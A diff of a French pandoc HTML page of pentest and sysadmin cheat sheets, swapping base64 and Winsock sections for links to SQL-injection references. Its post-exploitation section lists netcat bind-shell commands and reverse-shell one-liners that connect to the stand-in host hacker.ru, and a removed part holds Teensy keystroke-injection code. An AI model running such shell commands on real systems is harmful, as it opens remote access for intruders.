@@ -5,12 +5,13 @@
   <meta http-equiv="Content-Style-Type" content="text/css" />
   <meta name="generator" content="pandoc" />
   <meta name="author" content="Poulpy, Plopi42" />
-  <meta name="date" content="2014-01-08" />
+  <meta name="date" content="2014-02-06" />
   <title>Technical cheat sheets</title>
+  <style type="text/css">code{white-space: pre;}</style>
   <style type="text/css">
 table.sourceCode, tr.sourceCode, td.lineNumbers, td.sourceCode {
   margin: 0; padding: 0; vertical-align: baseline; border: none; }
-table.sourceCode { width: 100%; background-color: #f8f8f8; }
+table.sourceCode { width: 100%; line-height: 100%; background-color: #f8f8f8; }
 td.lineNumbers { text-align: right; padding-right: 4px; padding-left: 4px; color: #aaaaaa; border-right: 1px solid #aaaaaa; }
 td.sourceCode { padding-left: 5px; }
 pre, code { background-color: #f8f8f8; }
@@ -27,49 +28,26 @@ code > span.al { color: #ef2929; }
 code > span.fu { color: #000000; }
 code > span.er { font-weight: bold; }
   </style>
-  <link rel="stylesheet" href="extra/pandoc.css" type="text/css" />
+  <link rel="stylesheet" href="extra/buttondown.css" type="text/css" />
 </head>
 <body>
 <div id="header">
 <h1 class="title">Technical cheat sheets</h1>
 <h2 class="author">Poulpy, Plopi42</h2>
-<h3 class="date">2014-01-08</h3>
+<h3 class="date">2014-02-06</h3>
 </div>
 <div id="TOC">
 <ul>
-<li><a href="#cryptographie-et-encodage">Cryptographie et Encodage</a><ul>
-<li><a href="#ascii">ASCII</a><ul>
-<li><a href="#table-ascii">Table ASCII</a></li>
-</ul></li>
-<li><a href="#base-64">Base 64</a><ul>
-<li><a href="#description">Description</a></li>
-<li><a href="#tables-de-conversion">Tables de conversion</a><ul>
-<li><a href="#table-de-conversion-base-64-standard">Table de conversion base 64 standard</a></li>
-<li><a href="#table-de-conversion-base-64-pour-les-url">Table de conversion base 64 pour les URL</a></li>
-</ul></li>
-<li><a href="#exemples">Exemples</a><ul>
-<li><a href="#exemple-détaillé">Exemple détaillé</a></li>
-<li><a href="#autres-exemples">Autres exemples</a></li>
-</ul></li>
-</ul></li>
-</ul></li>
-<li><a href="#devlopment">Devlopment</a><ul>
-<li><a href="#web">Web</a><ul>
-<li><a href="#captchagenerator">captchaGenerator</a></li>
-</ul></li>
-<li><a href="#windows">Windows</a><ul>
-<li><a href="#socket-windows-en-c-c">Socket Windows en C / C++</a><ul>
-<li><a href="#client">Client</a></li>
-<li><a href="#serveur">Serveur</a></li>
-</ul></li>
+<li><a href="#internet">Internet</a><ul>
+<li><a href="#cheatsheet">CheatSheet</a><ul>
+<li><a href="#sqli">SQLi</a></li>
+<li><a href="#html">HTML</a></li>
+<li><a href="#multiples-categories">Multiples categories</a></li>
 </ul></li>
 </ul></li>
 <li><a href="#linux">Linux</a><ul>
-<li><a href="#linux-utils">Linux utils</a><ul>
-<li><a href="#affichage-de-ladresse-ip">Affichage de l’adresse IP</a><ul>
-<li><a href="#utilisation">Utilisation</a></li>
-<li><a href="#instalation">Instalation</a></li>
-</ul></li>
+<li><a href="#linux-tricks">Linux tricks</a><ul>
+<li><a href="#affichage-de-ladresse-ip">Affichage de l’adresse IP</a></li>
 <li><a href="#bash-tricks">Bash tricks</a></li>
 </ul></li>
 <li><a href="#commandes-linux-post-exploitation">Commandes Linux post exploitation</a><ul>
@@ -77,32 +55,13 @@ code > span.er { font-weight: bold; }
 <li><a href="#création-dun-reverse-bindshell">Création d’un reverse bindshell</a></li>
 </ul></li>
 </ul></li>
-<li><a href="#teensy">Teensy</a><ul>
-<li><a href="#envoie-de-mail-via-outlook-2007">Envoie de mail via outlook 2007</a></li>
-</ul></li>
 <li><a href="#tools">Tools</a><ul>
 <li><a href="#git">GIT</a><ul>
-<li><a href="#ressources">Ressources</a><ul>
-<li><a href="#fichier-de-configuration-.gitconfig">Fichier de configuration .gitconfig</a></li>
-<li><a href="#fichier-de-configuration-.gitignore">Fichier de configuration .gitignore</a></li>
-<li><a href="#script-dajout-didentité">Script d’ajout d’identité</a></li>
+<li><a href="#ressources">Ressources</a></li>
+<li><a href="#useful-commands">Useful commands</a></li>
 </ul></li>
-<li><a href="#useful-commands">Useful commands</a><ul>
-<li><a href="#change-log-information">Change log information</a></li>
-<li><a href="#récupérer-les-modifications-présentes-sur-le-serveur">Récupérer les modifications présentes sur le serveur</a></li>
-<li><a href="#mettre-à-jour-le-dépôt-local-par-rapport-au-dépôt-distant">Mettre à jour le dépôt local par rapport au dépôt distant</a></li>
-<li><a href="#faire-un-commit-local">Faire un commit local</a></li>
-<li><a href="#pousser-les-modifications-sur-le-serveur">Pousser les modifications sur le serveur</a></li>
-<li><a href="#créer-une-branche-sur-un-serveur-remote">Créer une branche sur un serveur (remote)</a></li>
-<li><a href="#merger-2-branches">Merger 2 branches</a></li>
-<li><a href="#supprimer-une-branche-locale">Supprimer une branche locale</a></li>
-<li><a href="#delete-a-remote-branch">Delete a Remote Branch</a></li>
-</ul></li>
-</ul></li>
-<li><a href="#grub-configuration">GRUB (configuration)</a><ul>
-<li><a href="#modification-de-la-taille-du-terminal">Modification de la taille du terminal</a></li>
-</ul></li>
-<li><a href="#grub-exploitation">GRUB (exploitation)</a><ul>
+<li><a href="#grub">GRUB</a><ul>
+<li><a href="#configuration---modification-de-la-taille-du-terminal">Configuration - Modification de la taille du terminal</a></li>
 <li><a href="#affichage-du-fichier-shadow">Affichage du fichier shadow</a></li>
 <li><a href="#récupération-dun-shell-root">Récupération d’un shell root</a></li>
 </ul></li>
@@ -114,370 +73,65 @@ code > span.er { font-weight: bold; }
 <li><a href="#hash-lm-vers-hash-ntlm">Hash LM vers Hash NTLM</a></li>
 </ul></li>
 <li><a href="#metasploit">Metasploit</a><ul>
-<li><a href="#genération-de-payload-exécutables">Genération de payload exécutables</a><ul>
-<li><a href="#manuel">Manuel</a></li>
-<li><a href="#exemple">Exemple</a><ul>
-<li><a href="#lister-les-options-dun-payload">Lister les options d’un payload</a></li>
-<li><a href="#créer-un-payload-meterpreter-pour-windows">Créer un payload meterpreter pour windows</a></li>
-<li><a href="#créer-un-payload-meterpreter-pour-linux">Créer un payload meterpreter pour Linux</a></li>
-</ul></li>
-<li><a href="#alternative">Alternative</a></li>
-</ul></li>
+<li><a href="#genération-de-payload-exécutables">Genération de payload exécutables</a></li>
 <li><a href="#lancement-de-handler">Lancement de handler</a></li>
 <li><a href="#exploitation-depuis-msfconsole">Exploitation depuis msfconsole</a></li>
 <li><a href="#contournement-des-antivirus">Contournement des antivirus</a></li>
 <li><a href="#passthehash-en-utilisant-metasploit">PassTheHash en utilisant metasploit</a></li>
-<li><a href="#récupération-de-mots-de-passe">Récupération de mots de passe</a><ul>
-<li><a href="#exploitation-de-mauvaise-configuration-de-client-samba">Exploitation de mauvaise configuration de client samba</a></li>
-</ul></li>
+<li><a href="#récupération-de-mots-de-passe">Récupération de mots de passe</a></li>
 </ul></li>
 <li><a href="#vlc">VLC</a><ul>
-<li><a href="#transcoding">Transcoding</a><ul>
-<li><a href="#vers-mp4">vers MP4</a></li>
-<li><a href="#vers-avi">vers AVI</a></li>
-</ul></li>
+<li><a href="#transcoding">Transcoding</a></li>
 <li><a href="#options-utiles">Options utiles</a></li>
 <li><a href="#net-casting-http">Net casting http</a></li>
 <li><a href="#devices">Devices</a></li>
 </ul></li>
+<li><a href="#vmware">VMWare</a><ul>
+<li><a href="#installer-une-vm-debian-7-avec-les-vmware-tools">Installer une VM debian 7 avec les VMWare tools</a></li>
 </ul></li>
-<li><a href="#windows-1">Windows</a><ul>
+</ul></li>
+<li><a href="#windows">Windows</a><ul>
 <li><a href="#configuration-de-windows-en-ligne-de-commande">Configuration de windows en ligne de commande</a><ul>
-<li><a href="#configuration-de-internet-explorer-en-ligne-de-commande">Configuration de Internet Explorer en ligne de commande</a><ul>
-<li><a href="#modifier-le-proxy-utilisé">Modifier le proxy utilisé</a></li>
-<li><a href="#activer-le-proxy">Activer le proxy</a></li>
-</ul></li>
-<li><a href="#configuration-de-la-carte-réseau-en-ligne-de-commande">Configuration de la carte réseau en ligne de commande</a><ul>
-<li><a href="#mise-en-place-dune-ip-statique">Mise en place d’une IP statique</a></li>
-<li><a href="#mise-en-place-de-dns">Mise en place de DNS</a></li>
-<li><a href="#mise-en-place-de-wins">Mise en place de WINS</a></li>
-</ul></li>
+<li><a href="#configuration-de-internet-explorer-en-ligne-de-commande">Configuration de Internet Explorer en ligne de commande</a></li>
+<li><a href="#configuration-de-la-carte-réseau-en-ligne-de-commande">Configuration de la carte réseau en ligne de commande</a></li>
 </ul></li>
 <li><a href="#ligne-de-commande-windows">Ligne de commande Windows</a><ul>
-<li><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a><ul>
-<li><a href="#activation-dun-utilisateur">activation d’un utilisateur</a></li>
-<li><a href="#désactivation-dun-utilisateur">désactivation d’un utilisateur</a></li>
-</ul></li>
+<li><a href="#gestion-des-utilisateurs">Gestion des utilisateurs</a></li>
 <li><a href="#gestion-des-services">Gestion des services</a></li>
 <li><a href="#gestion-des-fichiers">Gestion des fichiers</a></li>
 <li><a href="#commandes-utiles">Commandes utiles</a></li>
 <li><a href="#téléchargement-dun-fichier">Téléchargement d’un fichier</a></li>
+<li><a href="#récupération-de-la-clé-de-license">Récupération de la clé de license</a></li>
 </ul></li>
 </ul></li>
 </ul>
 </div>
-<h1 id="cryptographie-et-encodage"><a href="#TOC">Cryptographie et Encodage</a></h1>
-<h2 id="ascii"><a href="#TOC">ASCII</a></h2>
-<h3 id="table-ascii"><a href="#TOC">Table ASCII</a></h3>
-<div class="figure">
-<img src="../ressources/Cryptographie_et_Encodage/Ascii/Ascii.png" alt="Table ASCII" /><p class="caption">Table ASCII</p>
-</div>
-<h2 id="base-64"><a href="#TOC">Base 64</a></h2>
-<h3 id="description"><a href="#TOC">Description</a></h3>
-<p>La base 64 est un encodage de données utilisant 64 caractères standards et un caractère de complément ‘=’ utilisé comme bourage. Il est utilisé dans les messages électroniques (SMTP, POP, IMAP …) et dans les pages WEB. Il permet la transmission de tout type de données (images, vidéos, doc …) en mode texte. Il est défini en tant que codage MIME.</p>
-<p>Le résultat est plus important que la taille d’origine : 3octets = 4octets encodés.</p>
-<h3 id="tables-de-conversion"><a href="#TOC">Tables de conversion</a></h3>
-<h4 id="table-de-conversion-base-64-standard"><a href="#TOC">Table de conversion base 64 standard</a></h4>
-<div class="figure">
-<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-regular.png" title="Table de conversion base 64 standard" alt="Table de conversion base 64 standard" /><p class="caption">Table de conversion base 64 standard</p>
-</div>
-<h4 id="table-de-conversion-base-64-pour-les-url"><a href="#TOC">Table de conversion base 64 pour les URL</a></h4>
-<div class="figure">
-<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-url.png" title="Table de conversion base 64 pour les URL" alt="Table de conversion base 64 pour les URL" /><p class="caption">Table de conversion base 64 pour les URL</p>
-</div>
-<h3 id="exemples"><a href="#TOC">Exemples</a></h3>
-<h4 id="exemple-détaillé"><a href="#TOC">Exemple détaillé</a></h4>
-<div class="figure">
-<img src="../ressources/Cryptographie_et_Encodage/Base64/Base64-exemple.png" title="Exemple détaillé" alt="Exemple détaillé" /><p class="caption">Exemple détaillé</p>
-</div>
-<h4 id="autres-exemples"><a href="#TOC">Autres exemples</a></h4>
-<pre><code>$ echo -n &#39;A&#39; | base64
-QQ==</code></pre>
-<pre><code>$ echo -n &#39;AB&#39; | base64
-QUI=</code></pre>
-<pre><code>$ echo -n &#39;ABC&#39; | base64
-QUJD</code></pre>
-<pre><code>$ echo -n &#39;ABCA&#39; | base64
-QUJDQQ==</code></pre>
-<h1 id="devlopment"><a href="#TOC">Devlopment</a></h1>
-<h2 id="web"><a href="#TOC">Web</a></h2>
-<h3 id="captchagenerator"><a href="#TOC">captchaGenerator</a></h3>
-<h2 id="windows"><a href="#TOC">Windows</a></h2>
-<h3 id="socket-windows-en-c-c"><a href="#TOC">Socket Windows en C / C++</a></h3>
-<h4 id="client"><a href="#TOC">Client</a></h4>
-<pre class="sourceCode C"><code class="sourceCode c"><span class="ot">#define WIN32_LEAN_AND_MEAN</span>
-
-<span class="ot">#include &lt;windows.h&gt;</span>
-<span class="ot">#include &lt;winsock2.h&gt;</span>
-<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
-<span class="ot">#include &lt;stdlib.h&gt;</span>
-<span class="ot">#include &lt;stdio.h&gt;</span>
-
-
-<span class="co">// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib</span>
-<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
-<span class="ot">#pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
-<span class="ot">#pragma comment (lib, &quot;AdvApi32.lib&quot;)</span>
-
-
-<span class="ot">#define DEFAULT_BUFLEN 512</span>
-<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
-
-<span class="dt">int</span> __cdecl main(<span class="dt">int</span> argc, <span class="dt">char</span> **argv) 
-{
-    WSADATA wsaData;
-    SOCKET ConnectSocket = INVALID_SOCKET;
-    <span class="kw">struct</span> addrinfo *result = NULL,
-                    *ptr = NULL,
-                    hints;
-    <span class="dt">char</span> *sendbuf = <span class="st">&quot;this is a test&quot;</span>;
-    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
-    <span class="dt">int</span> iResult;
-    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
-
-    <span class="co">// Validate the parameters</span>
-    <span class="kw">if</span> (argc != <span class="dv">2</span>) {
-        printf(<span class="st">&quot;usage: %s server-name</span><span class="ch">\n</span><span class="st">&quot;</span>, argv[<span class="dv">0</span>]);
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Initialize Winsock</span>
-    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
-    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
-        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    ZeroMemory( &amp;hints, <span class="kw">sizeof</span>(hints) );
-    hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-
-    <span class="co">// Resolve the server address and port</span>
-    iResult = getaddrinfo(argv[<span class="dv">1</span>], DEFAULT_PORT, &amp;hints, &amp;result);
-    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
-        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Attempt to connect to an address until one succeeds</span>
-    <span class="kw">for</span>(ptr=result; ptr != NULL ;ptr=ptr-&gt;ai_next) {
-
-        <span class="co">// Create a SOCKET for connecting to server</span>
-        ConnectSocket = socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, 
-            ptr-&gt;ai_protocol);
-        <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
-            printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-            WSACleanup();
-            <span class="kw">return</span> <span class="dv">1</span>;
-        }
-
-        <span class="co">// Connect to server.</span>
-        iResult = connect( ConnectSocket, ptr-&gt;ai_addr, (<span class="dt">int</span>)ptr-&gt;ai_addrlen);
-        <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-            closesocket(ConnectSocket);
-            ConnectSocket = INVALID_SOCKET;
-            <span class="kw">continue</span>;
-        }
-        <span class="kw">break</span>;
-    }
-
-    freeaddrinfo(result);
-
-    <span class="kw">if</span> (ConnectSocket == INVALID_SOCKET) {
-        printf(<span class="st">&quot;Unable to connect to server!</span><span class="ch">\n</span><span class="st">&quot;</span>);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Send an initial buffer</span>
-    iResult = send( ConnectSocket, sendbuf, (<span class="dt">int</span>)strlen(sendbuf), <span class="dv">0</span> );
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    printf(<span class="st">&quot;Bytes Sent: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-
-    <span class="co">// shutdown the connection since no more data will be sent</span>
-    iResult = shutdown(ConnectSocket, SD_SEND);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ConnectSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Receive until the peer closes the connection</span>
-    <span class="kw">do</span> {
-
-        iResult = recv(ConnectSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
-        <span class="kw">if</span> ( iResult &gt; <span class="dv">0</span> )
-            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        <span class="kw">else</span> <span class="kw">if</span> ( iResult == <span class="dv">0</span> )
-            printf(<span class="st">&quot;Connection closed</span><span class="ch">\n</span><span class="st">&quot;</span>);
-        <span class="kw">else</span>
-            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-
-    } <span class="kw">while</span>( iResult &gt; <span class="dv">0</span> );
-
-    <span class="co">// cleanup</span>
-    closesocket(ConnectSocket);
-    WSACleanup();
-
-    <span class="kw">return</span> <span class="dv">0</span>;
-}</code></pre>
-<h4 id="serveur"><a href="#TOC">Serveur</a></h4>
-<pre class="sourceCode C"><code class="sourceCode c">
-<span class="ot">#define WIN32_LEAN_AND_MEAN</span>
-
-<span class="ot">#undef UNICODE</span>
-
-
-<span class="ot">#include &lt;windows.h&gt;</span>
-<span class="ot">#include &lt;winsock2.h&gt;</span>
-<span class="ot">#include &lt;ws2tcpip.h&gt;</span>
-<span class="ot">#include &lt;stdlib.h&gt;</span>
-<span class="ot">#include &lt;stdio.h&gt;</span>
-
-<span class="co">// Need to link with Ws2_32.lib</span>
-<span class="ot">#pragma comment (lib, &quot;Ws2_32.lib&quot;)</span>
-<span class="co">// #pragma comment (lib, &quot;Mswsock.lib&quot;)</span>
-
-<span class="ot">#define DEFAULT_BUFLEN 512</span>
-<span class="ot">#define DEFAULT_PORT &quot;27015&quot;</span>
-
-<span class="dt">int</span> __cdecl main(<span class="dt">void</span>) 
-{
-    WSADATA wsaData;
-    <span class="dt">int</span> iResult;
-
-    SOCKET ListenSocket = INVALID_SOCKET;
-    SOCKET ClientSocket = INVALID_SOCKET;
-
-    <span class="kw">struct</span> addrinfo *result = NULL;
-    <span class="kw">struct</span> addrinfo hints;
-
-    <span class="dt">int</span> iSendResult;
-    <span class="dt">char</span> recvbuf[DEFAULT_BUFLEN];
-    <span class="dt">int</span> recvbuflen = DEFAULT_BUFLEN;
-
-    <span class="co">// Initialize Winsock</span>
-    iResult = WSAStartup(MAKEWORD(<span class="dv">2</span>,<span class="dv">2</span>), &amp;wsaData);
-    <span class="kw">if</span> (iResult != <span class="dv">0</span>) {
-        printf(<span class="st">&quot;WSAStartup failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    ZeroMemory(&amp;hints, <span class="kw">sizeof</span>(hints));
-    hints.ai_family = AF_INET;
-    hints.ai_socktype = SOCK_STREAM;
-    hints.ai_protocol = IPPROTO_TCP;
-    hints.ai_flags = AI_PASSIVE;
-
-    <span class="co">// Resolve the server address and port</span>
-    iResult = getaddrinfo(NULL, DEFAULT_PORT, &amp;hints, &amp;result);
-    <span class="kw">if</span> ( iResult != <span class="dv">0</span> ) {
-        printf(<span class="st">&quot;getaddrinfo failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Create a SOCKET for connecting to server</span>
-    ListenSocket = socket(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);
-    <span class="kw">if</span> (ListenSocket == INVALID_SOCKET) {
-        printf(<span class="st">&quot;socket failed with error: %ld</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        freeaddrinfo(result);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Setup the TCP listening socket</span>
-    iResult = bind( ListenSocket, result-&gt;ai_addr, (<span class="dt">int</span>)result-&gt;ai_addrlen);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;bind failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        freeaddrinfo(result);
-        closesocket(ListenSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    freeaddrinfo(result);
-
-    iResult = listen(ListenSocket, SOMAXCONN);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;listen failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ListenSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// Accept a client socket</span>
-    ClientSocket = accept(ListenSocket, NULL, NULL);
-    <span class="kw">if</span> (ClientSocket == INVALID_SOCKET) {
-        printf(<span class="st">&quot;accept failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ListenSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// No longer need server socket</span>
-    closesocket(ListenSocket);
-
-    <span class="co">// Receive until the peer shuts down the connection</span>
-    <span class="kw">do</span> {
-
-        iResult = recv(ClientSocket, recvbuf, recvbuflen, <span class="dv">0</span>);
-        <span class="kw">if</span> (iResult &gt; <span class="dv">0</span>) {
-            printf(<span class="st">&quot;Bytes received: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iResult);
-
-        <span class="co">// Echo the buffer back to the sender</span>
-            iSendResult = send( ClientSocket, recvbuf, iResult, <span class="dv">0</span> );
-            <span class="kw">if</span> (iSendResult == SOCKET_ERROR) {
-                printf(<span class="st">&quot;send failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-                closesocket(ClientSocket);
-                WSACleanup();
-                <span class="kw">return</span> <span class="dv">1</span>;
-            }
-            printf(<span class="st">&quot;Bytes sent: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, iSendResult);
-        }
-        <span class="kw">else</span> <span class="kw">if</span> (iResult == <span class="dv">0</span>)
-            printf(<span class="st">&quot;Connection closing...</span><span class="ch">\n</span><span class="st">&quot;</span>);
-        <span class="kw">else</span>  {
-            printf(<span class="st">&quot;recv failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-            closesocket(ClientSocket);
-            WSACleanup();
-            <span class="kw">return</span> <span class="dv">1</span>;
-        }
-
-    } <span class="kw">while</span> (iResult &gt; <span class="dv">0</span>);
-
-    <span class="co">// shutdown the connection since we&#39;re done</span>
-    iResult = shutdown(ClientSocket, SD_SEND);
-    <span class="kw">if</span> (iResult == SOCKET_ERROR) {
-        printf(<span class="st">&quot;shutdown failed with error: %d</span><span class="ch">\n</span><span class="st">&quot;</span>, WSAGetLastError());
-        closesocket(ClientSocket);
-        WSACleanup();
-        <span class="kw">return</span> <span class="dv">1</span>;
-    }
-
-    <span class="co">// cleanup</span>
-    closesocket(ClientSocket);
-    WSACleanup();
-
-    <span class="kw">return</span> <span class="dv">0</span>;
-}</code></pre>
-<h1 id="linux"><a href="#TOC">Linux</a></h1>
-<h2 id="linux-utils"><a href="#TOC">Linux utils</a></h2>
-<h3 id="affichage-de-ladresse-ip"><a href="#TOC">Affichage de l’adresse IP</a></h3>
-<h4 id="utilisation"><a href="#TOC">Utilisation</a></h4>
+<h1 id="internet"><a href="#internet">Internet</a></h1>
+<h2 id="cheatsheet"><a href="#cheatsheet">CheatSheet</a></h2>
+<p><a href="../ressources/CheatSheet/">local path : 2014-02-06</a></p>
+<h3 id="sqli"><a href="#sqli">SQLi</a></h3>
+<p><a href="http://www.websec.ca/kb/sql_injection">The SQL Injection Knowledge Base</a></p>
+<p><a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/">SQL Injection Cheat Sheet</a></p>
+<p><a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access SQL Injection Cheat Sheet</a></p>
+<p><a href="https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet">SQLite3 Injection Cheat Sheet</a></p>
+<p><a href="https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">sqli-filter-evasion-cheat-sheet-mysql</a></p>
+<p><a href="http://bobby-tables.com/">A guide to preventing SQL injection</a></p>
+<h3 id="html"><a href="#html">HTML</a></h3>
+<p><a href="http://html5sec.org/">HTML5 Security Cheatsheet</a></p>
+<h3 id="multiples-categories"><a href="#multiples-categories">Multiples categories</a></h3>
+<p>Shell, SQLi, Tools</p>
+<p><a href="http://pentestmonkey.net/cheat-sheet">Pentestmonkey</a></p>
+<p><a href="http://averagesecurityguy.info/cheat-sheet/">averagesecurityguy</a></p>
+<p><a href="https://www.owasp.org/index.php/Virtual_Patching_Cheat_Sheet">Virtual Patching Cheat Sheet</a></p>
+<p><a href="http://www.tug.org/texshowcase/cheat.pdf">Theoretical Computer Science Cheat Sheet</a></p>
+<h1 id="linux"><a href="#linux">Linux</a></h1>
+<h2 id="linux-tricks"><a href="#linux-tricks">Linux tricks</a></h2>
+<h3 id="affichage-de-ladresse-ip"><a href="#affichage-de-ladresse-ip">Affichage de l’adresse IP</a></h3>
+<h4 id="utilisation"><a href="#utilisation">Utilisation</a></h4>
 <pre><code>ifdata -pa eth0</code></pre>
-<h4 id="instalation"><a href="#TOC">Instalation</a></h4>
+<h4 id="instalation"><a href="#instalation">Instalation</a></h4>
 <pre><code>apt-get install moreutils</code></pre>
-<h3 id="bash-tricks"><a href="#TOC">Bash tricks</a></h3>
+<h3 id="bash-tricks"><a href="#bash-tricks">Bash tricks</a></h3>
 <p>The following tricks use the bash history.</p>
 <pre><code>$ echo toto
 toto
@@ -509,107 +163,21 @@ toto titi
 $ echo !-2:1
 echo tata
 tata</code></pre>
-<h2 id="commandes-linux-post-exploitation"><a href="#TOC">Commandes Linux post exploitation</a></h2>
-<h3 id="création-dun-bindshell"><a href="#TOC">Création d’un bindshell</a></h3>
+<h2 id="commandes-linux-post-exploitation"><a href="#commandes-linux-post-exploitation">Commandes Linux post exploitation</a></h2>
+<h3 id="création-dun-bindshell"><a href="#création-dun-bindshell">Création d’un bindshell</a></h3>
 <pre><code>nc -e /bin/bash -lp 8080</code></pre>
 <p>Si la première version ne fonctionne pas :</p>
 <pre><code>nc -e /bin/bash -l 8080</code></pre>
-<h3 id="création-dun-reverse-bindshell"><a href="#TOC">Création d’un reverse bindshell</a></h3>
+<h3 id="création-dun-reverse-bindshell"><a href="#création-dun-reverse-bindshell">Création d’un reverse bindshell</a></h3>
 <pre><code>/bin/bash &lt; /dev/tcp/hacker.ru/80 1&gt;&amp;0</code></pre>
 <p>Si netcat est présent :</p>
 <pre><code>nc -e /bin/bash hacker.ru 80</code></pre>
-<h1 id="teensy"><a href="#TOC">Teensy</a></h1>
-<h3 id="envoie-de-mail-via-outlook-2007"><a href="#TOC">Envoie de mail via outlook 2007</a></h3>
-<pre class="sourceCode C"><code class="sourceCode c"><span class="dt">const</span> <span class="dt">int</span> ledPin = <span class="dv">13</span>;
-<span class="dt">int</span> doit = <span class="dv">0</span>;
-
-<span class="dt">void</span> pressKeyWithModifier(<span class="dt">uint8_t</span> modifier, <span class="dt">uint8_t</span> key)
-{
-  Keyboard.set_modifier(modifier);
-  Keyboard.set_key1(key);
-  Keyboard.send_now();
-  delay(<span class="dv">45</span>);
-
-  Keyboard.set_modifier(<span class="dv">0</span>);
-  Keyboard.set_key1(<span class="dv">0</span>);
-  Keyboard.send_now();
-  delay(<span class="dv">45</span>);
-}
-
-<span class="dt">void</span> launchCmd(<span class="dt">const</span> <span class="dt">char</span>* cmd)
-{
-  pressKeyWithModifier(MODIFIERKEY_GUI, KEY_R);
-  Keyboard.println(cmd);
-}
-
-<span class="dt">void</span> waitAndBlink(<span class="dt">int</span> waitTime, <span class="dt">int</span> blinkDelay)
-{
-  delay(waitTime);
-  digitalWrite(ledPin, LOW);
-  delay(blinkDelay);
-  digitalWrite(ledPin, HIGH);
-}
-
-<span class="dt">void</span> setup()
-{
-  pinMode(ledPin, OUTPUT);
-  digitalWrite(ledPin, HIGH);
-
-  doit = <span class="dv">0</span>;
-}
-
-<span class="dt">void</span> writeMail(<span class="dt">const</span> <span class="dt">char</span>* to, <span class="dt">const</span> <span class="dt">char</span>* subject, <span class="dt">const</span> <span class="dt">char</span>* content, <span class="dt">const</span> <span class="dt">char</span>* sign)
-{
-  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
-
-  pressKeyWithModifier(MODIFIERKEY_GUI, KEY_R);
-  waitAndBlink(<span class="dv">200</span>, <span class="dv">200</span>);
-  Keyboard.print(<span class="st">&quot;mailto:&quot;</span>);
-  Keyboard.print(to);
